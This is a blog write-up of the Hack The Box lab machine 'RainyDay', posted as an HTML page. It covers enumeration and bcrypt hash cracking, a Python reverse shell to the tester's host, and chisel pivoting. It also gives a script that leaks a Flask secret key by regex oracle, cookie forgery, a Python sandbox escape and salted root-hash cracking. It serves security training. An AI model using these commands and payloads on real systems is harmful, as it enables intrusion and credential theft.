@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - RainyDay [Hard] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - RainyDay [Hard]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.59.24 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://rainycloud.htb Add rainycloud.htb to /etc/hosts Web Enum dirsearch &gt; dirsearch -u http://rainycloud."/>
+
+    <meta property="og:title" content="HTB - RainyDay [Hard]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.59.24 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://rainycloud.htb Add rainycloud.htb to /etc/hosts Web Enum dirsearch &gt; dirsearch -u http://rainycloud." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/rainyday/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-10-16T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-10-16T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - RainyDay [Hard]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 16, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.59.24 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp open http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://rainycloud.htb
+</code></pre><ul>
+<li>Add rainycloud.htb to /etc/hosts</li>
+</ul>
+<h1 id="web-enum">Web Enum</h1>
+<ul>
+<li>dirsearch</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://rainycloud.htb
+          
+[01:03:51] 308 -  239B  - /api  -&gt;  http://rainycloud.htb/api/              
+[01:03:52] 200 -  649B  - /api/                                             
+[01:04:33] 200 -    3KB - /login                                            
+[01:04:34] 302 -  189B  - /logout  -&gt;  /                                    
+[01:04:41] 302 -  199B  - /new  -&gt;  /login                                  
+[01:04:56] 200 -    4KB - /register
+</code></pre><ul>
+<li>subdomain discovery</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://rainycloud.htb/&#34; -H &#34;Host: FUZZ.rainycloud.htb&#34;
+
+000000019:   403        0 L      5 W        26 Ch       &#34;dev&#34;
+</code></pre><ul>
+<li>On a login failure, the page source shows the following comments</li>
+</ul>
+<pre tabindex="0"><code>&lt;!-- Sign In Form --&gt;
+
+&lt;!-- RainyCloud-4: TODO - Remove debug errors from prod --&gt;
+&lt;h4&gt; Error - Login Incorrect! &lt;!-- /var/www/rainycloud/./app.py:288 --&gt;&lt;/h4&gt;
+</code></pre><ul>
+<li>Found the following paths and corresponding hashes</li>
+</ul>
+<pre tabindex="0"><code>http://rainycloud.htb/api/user/1.0
+http://rainycloud.htb/api/user/2.0
+http://rainycloud.htb/api/user/3.0
+
+jack:$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O
+root:$2a$05$x4nSvCqGHZBmBQnmNM2nXeWDzVvvsXaJiHsSv1pwZnxrcBFbOibZS
+gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG
+
+rubberducky
+</code></pre><ul>
+<li><code>gary</code> password hash can be cracked: <code>rubberducky</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat.exe -m 3200 hashes.txt rockyou.txt
+</code></pre><h1 id="foothold-container">Foothold: container</h1>
+<ul>
+<li>Once logged in as gary, go to the <code>http://rainycloud.htb/containers</code> page and create a new container with any name</li>
+<li>Once the container is created, <code>Execute Command (background)</code> and you can enter a python reverse shell there</li>
+</ul>
+<pre tabindex="0"><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.3&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;
+</code></pre><h1 id="internal-network-discovery">Internal Network Discovery</h1>
+<ul>
+<li>Setup chisel pivot</li>
+</ul>
+<pre tabindex="0"><code># on kali
+./chisel server -p 9999 --reverse
+
+# on container
+./chisel client --max-retry-count=1 10.10.16.3:9999 R:1080:socks
+</code></pre><ul>
+<li>Scan internal hosts</li>
+</ul>
+<pre tabindex="0"><code>&gt; for p in {1..1024}; do proxychains -q nc -vn 172.18.0.1 $p -w 1 -z &amp; done 2&gt; output.txt
+
+&gt; cat output.txt| grep Connected
+Ncat: Connected to 172.18.0.1:22.
+Ncat: Connected to 172.18.0.1:80.
+</code></pre><ul>
+<li>From previous subdomain enum, there is a <code>dev</code> subdomain that returned a 403. However, we are able to reach it via the pivot.</li>
+</ul>
+<pre tabindex="0"><code>&gt; proxychains curl http://172.18.0.1/
+</code></pre><ul>
+<li>So, this means the site might be IP restricted; and the subdomain might be running on 172.18.0.1. To prove so, we need to pivot the remote port 172.18.0.1:80 onto local port.</li>
+<li>Change the chisel pivot on target to map a specific port</li>
+</ul>
+<pre tabindex="0"><code># on container
+./chisel client --max-retry-count=1 10.10.16.3:9999 R:8888:172.18.0.1:80
+
+# on kali, add the following entry to /etc/hosts
+127.0.0.1     dev.rainycloud.htb
+</code></pre><ul>
+<li>Now, browse to <code>http://dev.rainycloud.htb</code>, and we are able to see the dev page now.</li>
+</ul>
+<h1 id="web-enum-dev">Web Enum: dev</h1>
+<ul>
+<li><code>http://dev.rainycloud.htb:8888/api/</code> give some API information</li>
+<li>There is a <code>/api/healthcheck</code> endpoint that supports POST methods and the parameters can be found be visiting the endpoint</li>
+</ul>
+<pre tabindex="0"><code>{&#34;result&#34;:true,&#34;results&#34;:[{&#34;file&#34;:&#34;/bin/bash&#34;,&#34;pattern&#34;:{&#34;type&#34;:&#34;ELF&#34;}},{&#34;file&#34;:&#34;/var/www/rainycloud/app.py&#34;,&#34;pattern&#34;:{&#34;type&#34;:&#34;PYTHON&#34;}},{&#34;file&#34;:&#34;/var/www/rainycloud/sessions/db.sqlite&#34;,&#34;pattern&#34;:{&#34;type&#34;:&#34;SQLITE&#34;}},{&#34;file&#34;:&#34;/etc/passwd&#34;,&#34;pattern&#34;:{&#34;pattern&#34;:&#34;^root.*&#34;,&#34;type&#34;:&#34;CUSTOM&#34;}}]}
+</code></pre><ul>
+<li>The <code>CUSTOM</code> option can be used to match patterns in a file, we can use this to find out the secret key that is used to encrypt the cookie and gain access as another user by crafting the cookie by ourselves.</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://dev.rainycloud.htb:8888/api/healthcheck --cookie &#39;session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0u9bg.Z-xCrPK1O0uS4rXo5pLAKLOMuSU&#39; -d &#39;file=/etc/passwd&amp;type=custom&amp;pattern=^root.*&#39;
+
+{&#34;result&#34;:true,&#34;results&#34;:[{&#34;file&#34;:&#34;/etc/passwd&#34;,&#34;pattern&#34;:{&#34;pattern&#34;:&#34;^root.*&#34;,&#34;type&#34;:&#34;CUSTOM&#34;}}]}
+</code></pre><ul>
+<li>Fuzz for available files</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -b &#39;session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0u9bg.Z-xCrPK1O0uS4rXo5pLAKLOMuSU&#39; -d &#39;file=/var/www/rainycloud/FUZZ.py&amp;type=custom&amp;pattern=^SECRET_KEY.*&#39; --hc 500 http://dev.rainycloud.htb:8888/api/healthcheck
+
+000000432:   200        1 L      1 W        120 Ch      &#34;app&#34;
+000003538:   200        1 L      1 W        123 Ch      &#34;secrets&#34;
+
+# confirm that SECRET_KEY is in secrets.py
+&gt; curl http://dev.rainycloud.htb:8888/api/healthcheck --cookie &#39;session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0u9bg.Z-xCrPK1O0uS4rXo5pLAKLOMuSU&#39; -d &#39;file=/var/www/rainycloud/secrets.py&amp;type=custom&amp;pattern=^SECRET_KEY.*&#39;
+
+{&#34;result&#34;:true,&#34;results&#34;:[{&#34;file&#34;:&#34;/var/www/rainycloud/secrets.py&#34;,&#34;pattern&#34;:{&#34;pattern&#34;:&#34;^SECRET_KEY.*&#34;,&#34;type&#34;:&#34;CUSTOM&#34;}}]}
+</code></pre><ul>
+<li>Fuzz for SECRET_KEY, <code>f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>allchars <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
+</span></span><span style="display:flex;"><span>cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;session&#39;</span>: <span style="color:#e6db74">&#39;eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0u9bg.Z-xCrPK1O0uS4rXo5pLAKLOMuSU&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> allchars:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            rsp <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://dev.rainycloud.htb:8888/api/healthcheck&#39;</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;file&#39;</span>: <span style="color:#e6db74">&#39;/var/www/rainycloud/secrets.py&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;type&#39;</span>: <span style="color:#e6db74">&#39;custom&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pattern&#39;</span>: <span style="color:#e6db74">&#34;^SECRET_KEY = &#39;&#34;</span> <span style="color:#f92672">+</span> pattern <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.*&#34;</span>
+</span></span><span style="display:flex;"><span>            }, cookies<span style="color:#f92672">=</span>cookies)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> json<span style="color:#f92672">.</span>loads(rsp<span style="color:#f92672">.</span>content)[<span style="color:#e6db74">&#39;result&#39;</span>]:
+</span></span><span style="display:flex;"><span>                pattern <span style="color:#f92672">+=</span> c
+</span></span><span style="display:flex;"><span>                print(pattern)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(c)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            print(rsp<span style="color:#f92672">.</span>content)
+</span></span></code></pre></div><h1 id="user-flag-jack">User flag: jack</h1>
+<ul>
+<li>Generate session cookie for user <code>jack</code> using a tool called <code>flask_session_cookie_manager</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; flask_session_cookie_manager3.py encode -s f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67 -t &#34;{&#39;username&#39;: &#39;jack&#39;}&#34;
+</code></pre><ul>
+<li>Copy and paste the cookie into browser cookie and login as jack, then you can repeat the previouse foothold process to access the secrets container.</li>
+<li>Upload <code>pspy64</code> and monitor the background processes, there is a <code>sleep</code> command with excessively long time</li>
+</ul>
+<pre tabindex="0"><code>2022/10/17 01:24:20 CMD: UID=1000 PID=1200   | sleep 100000000
+</code></pre><ul>
+<li>Explore this <code>proc</code> for info found that it has a mount on the host folder where you can find the private key of jack</li>
+</ul>
+<pre tabindex="0"><code>&gt; /proc/1200/root/home/jack/.ssh/id_rsa
+</code></pre><ul>
+<li>Login as jack to fetch the user flag</li>
+</ul>
+<h1 id="pe-jack_adm">PE: jack_adm</h1>
+<ul>
+<li>A command can be run as jack_adm</li>
+</ul>
+<pre tabindex="0"><code>jack@rainyday:~$ sudo -l
+Matching Defaults entries for jack on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack may run the following commands on localhost:
+    (jack_adm) NOPASSWD: /usr/bin/safe_python *
+</code></pre><ul>
+<li>This is a python sandbox escape scenario, where some keywords are filtered out. So, the typical approach is to re-load back the filtered builtins, and aim to import <code>os</code></li>
+</ul>
+<pre tabindex="0"><code># ().__class__.__mro__[1].__subclasses__()[144] -&gt; warnings.catch_warnings
+# https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html
+&gt; echo &#39;print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__[&#34;__builtins__&#34;][&#34;__loader__&#34;]().load_module(&#34;builtins&#34;).__import__(&#34;os&#34;).system(&#34;bash -i&#34;))&#39; &gt; /tmp/test &amp;&amp; sudo -u jack_adm /usr/bin/safe_python /tmp/test
+</code></pre><h1 id="pe-root">PE: root</h1>
+<ul>
+<li>Check commands that can be run as root</li>
+</ul>
+<pre tabindex="0"><code>jack_adm@rainyday:/home/jack$ sudo -l
+Matching Defaults entries for jack_adm on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack_adm may run the following commands on localhost:
+    (root) NOPASSWD: /opt/hash_system/hash_password.py
+</code></pre><ul>
+<li>Run the python script and leave the password blank, it will generate a random hash, save the hash to a file</li>
+</ul>
+<pre tabindex="0"><code>&gt; sudo /opt/hash_system/hash_password.py
+Enter Password&gt; 
+[+] Hash: $2b$05$x/p3650lBcUeg5PvP1PpmO2aLexNeNW.yU3Z.YRFph.ZEnR8ZUO0G
+</code></pre><ul>
+<li>Prepare the wordlist to crack this hash and crack it, this will take a while, be patient</li>
+</ul>
+<pre tabindex="0"><code># SecLists/Passwords/Leaked-Databases/md5decryptor-uk.txt
+&gt; hashcat -m 3200 hash.txt md5decryptor-uk.txt
+</code></pre><ul>
+<li>This will crack a salt value (<code>Sup3rDup3r</code>) used to encrypt the password, this can be used to crack the root password previously obtained from <code>/api/user/3.0</code>.</li>
+<li>Re-generate the wordlist with salt and crack the root hash: <code>246813579Sup3rDup3r</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; sed &#39;s/$/Sup3rDup3r/&#39; /usr/share/wordlists/rockyou.txt &gt; newrockyou.txt
+&gt; hashcat -m 3200 hash.txt newrockyou.txt
+</code></pre><ul>
+<li>Once the hash is crack, you can login as root and fetch the flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; su root
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
